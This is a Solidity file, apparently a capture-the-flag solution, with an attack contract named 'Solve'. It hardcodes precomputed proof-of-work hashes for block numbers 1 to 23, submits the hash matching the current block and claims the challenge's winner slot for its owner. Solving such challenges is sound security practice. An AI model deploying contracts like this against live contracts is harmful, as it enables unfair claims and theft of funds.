// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Chall {
    function registerBlock() external;
    function proveWork(bytes32 pow) external;
    function claimLastWinner(address winner) external;
}

contract Solve {
    Chall public chall;
    address public owner;
    mapping (uint => bytes32) solution;

    constructor(address _chall) {
        owner = msg.sender;
        chall = Chall(_chall);
        solution[1] = 0x5746ec50ea289e343251be889880092f02d27e59eb35213e3c813e220201fe19;
        solution[2] = 0x95dc8eaedc145086d06ed2befaaf59b299d1c6866a645c4dee75991e7ae058a7;
        solution[3] = 0xce8b9002cb998efb3ea9470a07bae2055c43eea6b64a5d690068476e826dd0cb;
        solution[4] = 0xbd7e648f0002f280eaa5e90255b39d26ca6f6476c64e81839f2a3034e6e156b8;
        solution[5] = 0xfc6a2a1bbefe4ea390b8cc8f3dcb6f0e596bdcf1e2297f104cc0d18cc8944e64;
        solution[6] = 0x40826c15a412b3ae1b6655ac7f4ad0beee2ad1215f0b876cfad7727a36baf722;
        solution[7] = 0x989298a86050cd4856ceb6e7a5d8df1af16eab4ae05d9fb8f85f2a8af4ada27c;
        solution[8] = 0x29cccfd36da26ed65d6330b423cb15fdc06d6212ec73820da3350fae1da814ed;
        solution[9] = 0xa5ee69c10b6ce76a8701bece683ee694133d7790030194714262062d281a7c9a;
        solution[10] = 0x933c0210ebb305f6f42cac6562d320ccd6b89e8b83ba836c29e4f88ec40bf8bc;
        solution[11] = 0x41f4ca51f78ddae2118e2a36921886b57b421efdc04a8acde9afce0c81617035;
        solution[12] = 0x5828ce927f94d5efb5746bc568026582389e200365f182d15945bfff511e7bdb;
        solution[13] = 0xfa680b24e75279f88acff575755d45173e671b60b145de3c3206055be2c8d8fb;
        solution[14] = 0x4f4500f5db9529d00632659081a26b89f6ec20738e495ec66085893f506a0c23;
        solution[15] = 0xfcfce016b5f81b3f55eb5e09a087f1962e2dbc4208134e6ea7a9d488b8ab6666;
        solution[16] = 0x5bc9d8181446e892dff82b9038d0cfa6ed9b289b57b32c41e26ddb7c0ea40da9;
        solution[17] = 0xd42cece8c7b2c94539e7968d2109e42c7e8c09788d965955f3b717161107d03d;
        solution[18] = 0xb24ed635b1d07823c9732d393862c4302faab837eb9b4e598a8c35f39a81736b;
        solution[19] = 0xb56d77f35461e4d09fa44251ccd9091610e51821bbd2e72e98a6f4587de0676d;
        solution[20] = 0x8c4128cd4f8a00088b4b9aa1bcd6d5526d47c9d617f272ad16b354dd7f89c0b7;
        solution[21] = 0x2aeb6726752eac5e4bd156129223ad396e8ac87ab17d0eadfd4d056fb4f3e9d3;
        solution[22] = 0xe108b5618a9f639479bf713096a921f1fb31b2cf56bd3d57ccbba7147d86d25e;
        solution[23] = 0xcff74d6f4c577f8ab75daf3b94a647ac1b38a64cddc8fc3547e106052eccadd8;
    }

    function attack() public {
        chall.registerBlock();
        chall.proveWork(solution[block.number]);
        chall.claimLastWinner(owner);
    }
}
